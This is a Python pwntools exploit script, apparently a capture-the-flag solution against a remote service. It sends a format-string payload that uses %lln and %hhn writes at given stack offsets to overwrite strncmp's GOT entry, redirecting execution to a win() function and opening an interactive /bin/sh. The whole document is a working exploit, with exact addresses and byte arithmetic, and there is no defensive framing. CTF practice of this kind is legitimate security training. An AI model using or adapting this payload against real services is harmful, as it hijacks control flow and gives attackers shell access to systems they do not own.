#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux", log_level="info")

HOST, PORT = "6447.lol", 4003

# Minimal, deterministic payload:
# 1) %11$lln writes total printed count (0x11F6) into 0x4034f8 (low 2 bytes of strncmp@GOT)
# 2) %12$hhn writes the low 1 byte of the new count (0x40 from 0x1240) into 0x4034fa (3rd byte)
payload = b"%4598c%11$lln"  # 4598 (dec) == 0x11F6
payload += b"%74c%12$hhn"  # 4598+74=4672 (0x1240) -> low byte 0x40
payload += p64(0x4034F8)  # %11$ -> strncmp@GOT
payload += p64(0x4034FA)  # %12$ -> strncmp@GOT+2

io = remote(HOST, PORT)  # For local: io = process("./meme")
io.recvuntil(b": ")  # "... speak the phrase ...: "
io.sendline(payload)  # Triggers win() immediately
io.interactive()  # Get /bin/sh
